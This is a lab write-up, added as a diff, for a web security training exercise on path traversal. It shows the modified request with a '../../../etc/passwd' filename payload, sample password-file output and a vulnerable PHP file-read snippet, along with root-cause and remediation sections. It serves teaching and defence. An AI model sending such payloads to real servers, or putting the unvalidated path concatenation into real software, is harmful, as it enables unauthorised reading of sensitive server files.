@@ -1,0 +1,181 @@
+# File Path Traversal, Simple Case
+
+## Lab Information
+
+| Field | Value |
+|-------|-------|
+| Lab | File path traversal, simple case |
+| Category | Path Traversal / Directory Traversal |
+| Severity | High |
+| CWE | CWE-22 – Improper Limitation of a Pathname to a Restricted Directory |
+| OWASP Top 10 | A01:2021 – Broken Access Control |
+
+---
+
+# Executive Summary
+
+The application was vulnerable to a classic **Path Traversal** vulnerability. The server used user-controlled input from the `filename` parameter to locate files on the filesystem without properly validating or sanitizing the supplied path.
+
+By injecting directory traversal sequences (`../`), it was possible to escape the intended image directory and access arbitrary files stored on the server.
+
+To demonstrate the vulnerability, the Linux `/etc/passwd` file was successfully retrieved.
+
+---
+
+# Objective
+
+Read the contents of:
+
+```text
+/etc/passwd
+```
+
+---
+
+# Vulnerability Discovery
+
+While browsing the application, product images were loaded using the following request:
+
+```http
+GET /image?filename=58.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+The `filename` parameter appeared to be directly used by the server to retrieve files from disk.
+
+---
+
+# Exploitation
+
+The `filename` parameter was modified to include directory traversal sequences.
+
+Original request:
+
+```http
+GET /image?filename=58.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+Modified request:
+
+```http
+GET /image?filename=../../../etc/passwd HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+---
+
+# Result
+
+Instead of returning an image, the server responded with the contents of the Linux password file.
+
+Example:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+The successful disclosure confirmed that arbitrary files outside the intended directory could be accessed.
+
+---
+
+# Technical Analysis
+
+The vulnerable application likely performed an operation similar to:
+
+```php
+$file = "/images/" . $_GET['filename'];
+readfile($file);
+```
+
+When supplied with:
+
+```text
+58.jpg
+```
+
+the resulting path becomes:
+
+```text
+/images/58.jpg
+```
+
+However, using:
+
+```text
+../../../etc/passwd
+```
+
+produces a path equivalent to:
+
+```text
+/images/../../../etc/passwd
+```
+
+The operating system normalizes this path, resolving it to:
+
+```text
+/etc/passwd
+```
+
+Because the application performs no validation to ensure that the final path remains inside the intended directory, the attacker can access arbitrary files on the server.
+
+---
+
+# Root Cause
+
+The application concatenates user-controlled input with a filesystem path without validating the resulting location.
+
+No protection exists against directory traversal sequences such as:
+
+```text
+../
+```
+
+As a result, attackers can escape the intended directory and access sensitive files.
+
+---
+
+# Impact
+
+A successful attacker may be able to:
+
+- Read arbitrary files from the server.
+- Obtain configuration files.
+- Retrieve application source code.
+- Leak credentials and API keys.
+- Gather information useful for further attacks.
+- Facilitate privilege escalation or Remote Code Execution in chained attacks.
+
+---
+
+# Remediation
+
+Recommended mitigations include:
+
+- Validate user input using an allowlist of expected filenames.
+- Reject any path containing traversal sequences such as `../`.
+- Canonicalize the requested path and verify that it remains within the intended directory.
+- Use indirect object references instead of exposing filesystem paths.
+- Configure the web server and operating system with least-privilege permissions.
+
+---
+
+# References
+
+- PortSwigger Web Security Academy – Path Traversal
+- OWASP Path Traversal
+- CWE-22 – Improper Limitation of a Pathname to a Restricted Directory
+
+---
+
+# Key Takeaways
+
+This lab demonstrates one of the most common file disclosure vulnerabilities.
+
+Although the attack consists of a simple manipulation of a URL parameter, the impact can be severe because it allows attackers to read sensitive files stored on the server.
+
+Path Traversal vulnerabilities often serve as the first step in more advanced attack chains, leading to information disclosure, credential theft, or even Remote Code Execution when combined with other weaknesses.
